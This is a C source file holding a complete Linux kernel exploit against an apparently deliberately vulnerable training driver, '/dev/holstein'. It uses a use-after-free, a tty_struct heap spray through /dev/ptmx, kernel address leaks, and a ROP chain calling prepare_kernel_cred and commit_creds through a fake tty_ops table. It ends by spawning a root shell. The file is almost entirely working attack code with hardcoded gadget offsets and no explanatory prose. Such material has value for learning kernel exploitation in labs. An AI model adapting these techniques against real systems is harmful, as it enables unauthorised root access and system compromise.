
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

#define ERROR(x) printf("Error: %s\n", x); return -1;
#define tty_ops_offset                0xc39c60
#define pop_rdi_ret                   0x14078a + kbase
#define pop_rcx_ret                   0x0eb7e4 + kbase
#define mov_rdi_rax_rep_movsq_ret     0x638e9b + kbase // mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret; 
#define push_rdx_pop_rsp_pop_rbp_ret  0x14fbea + kbase // push rdx; xor eax, 0x415b004f; pop rsp; pop rbp; ret; 
#define commit_creds                  0x0723c0 + kbase
#define prepare_kernel_creds          0x072560 + kbase
#define kpti_trampoline               0x800e26 + kbase

uint64_t user_cs, user_ss, user_rflags, user_sp;
void spawn_shell(void){
    printf("We back to userland!\n");
    uint8_t uid = getuid();
    if(uid == 0){
        printf("UID is: %d\nYou just rooted the machine!\n", uid);
    }
    else {
        printf("UID is: %d\nYou didn't root the machine unfortunately..\n", uid);
        exit(-1);
    }
    system("/bin/sh");
}

uint64_t user_rip = (uint64_t) spawn_shell;
void save_user_state(void){ // save the state of our user context
   __asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"  // user code segment
    "mov user_ss, ss;"  // user stack segment
    "mov user_sp, rsp;" // user stack
    "pushfq;"           // user rflags
    "pop user_rflags;" 
    ".att_syntax;"
    );
}

int exp_ret2usr(){
    save_user_state();
    /* fill kmalloc-1024 with tty_struct */ 
    int fd1, fd2, fd3, fd4;
    uint64_t payload[0x400/sizeof(uint64_t)], payload2[0x400/sizeof(uint64_t)], leak[0x400/sizeof(uint64_t)];
    if((fd1=open("/dev/holstein", O_RDWR)) < 0){ERROR("failed to open the vulnerable device..")} // allocate: fd1->g_buf
    if((fd2=open("/dev/holstein", O_RDWR)) < 0){ERROR("failed to open the vulnerable device..")} // allocate: fd2->g_buf (now we overwritten the fd1->g_buf pointer)
    close(fd1); // free: fd2->g_buf
    
    /* fill kmalloc-1024 with tty_struct, so fd2 will point to tty_struct */ 
    uint8_t spray[100];
    /* Spray tty_struct so fd2->g_buf=tty_struct */
    for(int i = 0; i < 50; i++){
        if((spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY)) < 0){ERROR("Failed to spray, error while opening /dev/ptmx..")} 
    }

    if(read(fd2, payload, 0x400) < 0){ERROR("failed to read from the vulnerable device..")}
    uint64_t kbase = payload[0x18/sizeof(uint64_t)] - tty_ops_offset; // tty_ops at offset 0x18, tty_ops is also the function table pointer we want to fake
    uint64_t g_buf = payload[0x38/sizeof(uint64_t)] - 0x38;           // kernel heap leak to find the g_buf address
    printf("kernel base address:  %p\nkernel g_buf address: %p\n", kbase, g_buf);
    
    /* now finally rop! */
    int i = 0;
    payload[i++] = pop_rdi_ret;
    payload[i++] = 0x0;
    payload[i++] = prepare_kernel_creds;
    payload[i++] = pop_rcx_ret;
    payload[i++] = 0x0;
    payload[i++] = mov_rdi_rax_rep_movsq_ret;
    payload[i++] = commit_creds;
    payload[i++] = kpti_trampoline;
    payload[i++] = 0x0;
    payload[i++] = 0x0;
    payload[i++] = user_rip;
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_sp;
    payload[i++] = user_ss;    

    /* Find random place to set tty_ops table */
    payload[0x3f8/sizeof(uint64_t)] = push_rdx_pop_rsp_pop_rbp_ret; 
    if(write(fd2, payload, 0x400) < 0){ERROR("failed to write to the vulnerable device..")}

    /* Now UAF again cause we destroyed the rest of the tty_struct */
    if((fd3=open("/dev/holstein", O_RDWR)) < 0){ERROR("failed to open the vulnerable device..")} // allocate: fd3->g_buf
    if((fd4=open("/dev/holstein", O_RDWR)) < 0){ERROR("failed to open the vulnerable device..")} // allocate: fd4->g_buf (now we overwritten the fd3->g_buf pointer)
    close(fd3); // free: fd4->g_buf
    /* Spray tty_struct so fd4->g_buf=tty_struct */
    for(int i = 50; i < 100; i++){
        if((spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY)) < 0){ERROR("Failed to spray, error while opening /dev/ptmx..")} 
    }
    if(read(fd4, payload2, 0x400) < 0){ERROR("failed to read from the vulnerable device..")}
    payload2[0x18/sizeof(uint64_t)] = g_buf + 0x3f8 - 12 * 8; // our fake function entry is the 12th index of the table.
    if(write(fd4, payload2, 0x400) < 0){ERROR("failed to write to the vulnerable device..")}
    for(int i = 50; i < 100; i++){
        ioctl(spray[i], 0x0, g_buf-8);
    }
    
    return 0;
}




int main(int argc, char **argv){
    exp_ret2usr();
    return 0;
}